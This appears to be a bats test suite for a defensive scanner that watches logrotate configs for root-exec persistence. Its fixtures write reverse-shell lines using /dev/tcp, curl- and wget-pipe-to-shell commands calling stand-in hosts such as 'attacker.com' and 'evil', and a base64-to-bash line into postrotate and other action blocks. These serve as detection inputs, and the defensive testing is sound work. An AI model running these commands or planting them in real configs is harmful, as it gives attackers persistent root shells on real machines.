#!/usr/bin/env bats
# L2 bats functional tests for the logrotate-watchdog scan script.
#
# logrotate runs the prerotate/postrotate/firstaction/lastaction script
# blocks in /etc/logrotate.conf and /etc/logrotate.d/* AS ROOT on each
# (typically daily) rotation — a planted action block is recurring root-exec
# persistence (T1546). A logrotate file that is world-writable / non-root-
# owned, or contains a command-injection pattern, is alert.
#
# Run with: bats packaging/test/L2-logrotate-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd/logrotate-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    CONF="${TMP}/logrotate.conf"
}

teardown() { rm -rf "${TMP}"; }

# D pointed at a nonexistent dir so the test is isolated to the main conf.
run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_LOGROTATE_PROFILE="${PROFILE:-report}" \
    SELFDEF_LOGROTATE_BASELINE="${BASELINE}" \
    SELFDEF_LOGROTATE_FILE="${CONF_V:-$CONF}" \
    SELFDEF_LOGROTATE_D="${TMP}/no-logrotate-d" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '/var/log/nginx/*.log {\n  weekly\n  postrotate\n    /usr/bin/systemctl reload nginx\n  endscript\n}\n' > "${CONF}"
}

@test "no logrotate config → ok / no_logrotate" {
    CONF_V="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_logrotate"'
    cap | grep -q '"severity":"ok"'
}

@test "benign logrotate conf, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged logrotate conf on second run → ok / logrotate_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"logrotate_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "an injection pattern in a postrotate block → alert / logrotate_suspicious" {
    seed_benign
    run_wd
    printf '/var/log/x.log {\n  postrotate\n    bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n  endscript\n}\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"logrotate_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable logrotate conf → alert" {
    seed_benign
    run_wd
    chmod 0666 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign logrotate change → warn / logrotate_changed" {
    seed_benign
    run_wd
    printf '/var/log/nginx/*.log {\n  daily\n  postrotate\n    /usr/bin/systemctl reload nginx\n  endscript\n}\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"logrotate_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign postrotate using systemctl is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious postrotate block" {
    seed_benign
    run_wd
    printf '/var/log/x.log {\n  postrotate\n    curl http://evil/p|sh\n  endscript\n}\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — logrotate inventory enumerates root-exec-on-rotation surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in postrotate → alert" {
    seed_benign
    run_wd
    printf '/var/log/y.log {\n  postrotate\n    bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n  endscript\n}\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in prerotate → alert" {
    seed_benign
    run_wd
    printf '/var/log/z.log {\n  prerotate\n    wget -qO- http://attacker/p | sh\n  endscript\n}\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in firstaction → alert" {
    seed_benign
    run_wd
    printf '/var/log/q.log {\n  firstaction\n    echo YmFzaCAtaQ== | base64 -d | bash\n  endscript\n}\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable logrotate conf): group-writable → alert above world-writable bar" {
    seed_benign
    run_wd
    chmod 0664 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable logrotate conf): baseline_initial fires alert at install-time" {
    seed_benign
    chmod 0666 "${CONF}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-logrotate -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): logrotate-watchdog does NOT refresh baseline on injection-pattern detection — alert STAYS until operator updates" {
    # T1546 recurring root-exec persistence — alert must persist.
    seed_benign
    run_wd
    printf '/var/log/x.log {\n  postrotate\n    bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n  endscript\n}\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"logrotate_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    cat > "${CONF}" <<'EOF'
/var/log/nginx/*.log {
  weekly
  postrotate
    # future: bash -i >& /dev/tcp/evil/4444 0>&1
    /usr/bin/systemctl reload nginx
  endscript
}
EOF
    run_wd
    ! cap | grep -q '"event":"logrotate_suspicious"'
}

@test "INVARIANT (logrotate.d drop-in axis: injection in /etc/logrotate.d/*.conf → alert; not only main /etc/logrotate.conf)" {
    # Attackers may plant injection in /etc/logrotate.d/00-evil.conf
    # to avoid touching main /etc/logrotate.conf. Watchdog must
    # walk logrotate.d/ too.
    LOGROTATED="${TMP}/logrotate.d"
    mkdir -p "${LOGROTATED}"
    seed_benign
    PATH="${BIN}:${PATH}" \
        SELFDEF_MODULE_LIB="${LIB}" \
        SELFDEF_LOGROTATE_PROFILE=report \
        SELFDEF_LOGROTATE_BASELINE="${BASELINE}" \
        SELFDEF_LOGROTATE_FILE="${CONF}" \
        SELFDEF_LOGROTATE_D="${LOGROTATED}" \
        bash "${WD}"
    : > "${SELFDEF_TEST_LOGCAP}"
    cat > "${LOGROTATED}/00-evil" <<'EOF'
/var/log/evil.log {
  postrotate
    curl -s http://attacker.com/p | bash
  endscript
}
EOF
    PATH="${BIN}:${PATH}" \
        SELFDEF_MODULE_LIB="${LIB}" \
        SELFDEF_LOGROTATE_PROFILE=report \
        SELFDEF_LOGROTATE_BASELINE="${BASELINE}" \
        SELFDEF_LOGROTATE_FILE="${CONF}" \
        SELFDEF_LOGROTATE_D="${LOGROTATED}" \
        bash "${WD}"
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (lastaction block also scanned — not just postrotate+prerotate+firstaction)" {
    # logrotate has 4 action block types: prerotate/postrotate/
    # firstaction/lastaction. The pre-existing tests cover the
    # first 3. Lock lastaction coverage too.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    cat > "${CONF}" <<'EOF'
/var/log/x.log {
  weekly
  lastaction
    bash -i >& /dev/tcp/1.1.1.1/4444 0>&1
  endscript
}
EOF
    run_wd
    cap | grep -q '"severity":"alert"'
}
